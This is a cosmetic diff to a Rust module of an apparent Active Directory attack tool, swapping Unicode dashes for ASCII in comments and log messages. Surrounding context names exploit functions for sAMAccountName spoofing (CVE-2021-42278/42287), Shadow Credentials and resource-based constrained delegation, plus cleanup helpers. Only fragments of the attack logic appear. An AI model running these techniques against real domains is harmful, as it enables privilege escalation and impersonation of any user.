@@ -6,9 +6,9 @@ use kerberos_asn1::Asn1Object;
 use tracing::info;
 use x509_parser::prelude::*;
 
-// ─────────────────────────────────────────────────────────────
-// CVE-2021-42278 + CVE-2021-42287 — sAMAccountName Spoofing
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
+// CVE-2021-42278 + CVE-2021-42287 -- sAMAccountName Spoofing
+// -------------------------------------------------------------
 
 pub struct SamAccountNameSpoofResult {
     pub tgt_ticket: Vec<u8>,
@@ -39,7 +39,7 @@ pub async fn exploit_samname_spoof(
             ))
         })?;
 
-    info!("CVE-2021-42278: Requesting TGT — KDC should confuse names and issue DC ticket");
+    info!("CVE-2021-42278: Requesting TGT -- KDC should confuse names and issue DC ticket");
     let tgt = crate::proto::kerberos::request_tgt(dc_ip, domain, spoofed_name, password, false)
         .await
         .map_err(|e| OverthroneError::Custom(format!("CVE-2021-42278: TGT request failed: {e}")))?;
@@ -55,9 +55,9 @@ pub async fn exploit_samname_spoof(
     })
 }
 
-// ─────────────────────────────────────────────────────────────
-// Shadow Credentials — msDS-KeyCredentialLink → PKINIT TGT
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
+// Shadow Credentials -- msDS-KeyCredentialLink -> PKINIT TGT
+// -------------------------------------------------------------
 
 pub struct ShadowCredentialsResult {
     pub target_dn: String,
@@ -117,9 +117,9 @@ pub async fn exploit_shadow_credentials(
     })
 }
 
-// ─────────────────────────────────────────────────────────────
-// RBCD — Resource-Based Constrained Delegation
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
+// RBCD -- Resource-Based Constrained Delegation
+// -------------------------------------------------------------
 
 pub struct RbcdResult {
     pub target_dn: String,
@@ -158,7 +158,7 @@ pub async fn exploit_rbcd(
         })?;
 
     info!(
-        "RBCD: Delegation set — {attacker_computer_sam} can now impersonate any user to {target_dn}"
+        "RBCD: Delegation set -- {attacker_computer_sam} can now impersonate any user to {target_dn}"
     );
 
     Ok(RbcdResult {
@@ -168,9 +168,9 @@ pub async fn exploit_rbcd(
     })
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Cleanup Functions
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 pub async fn cleanup_rbcd(ldap: &mut LdapSession, target_dn: &str) -> Result<()> {
     ldap.modify_delete(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
@@ -200,9 +200,9 @@ pub async fn cleanup_shadow_credentials(ldap: &mut LdapSession, target_dn: &str)
     Ok(())
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Internal Helpers
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 fn build_key_credential_link_v2(cert_der: &[u8]) -> Result<Vec<u8>> {
     let (_, cert) = X509Certificate::from_der(cert_der)
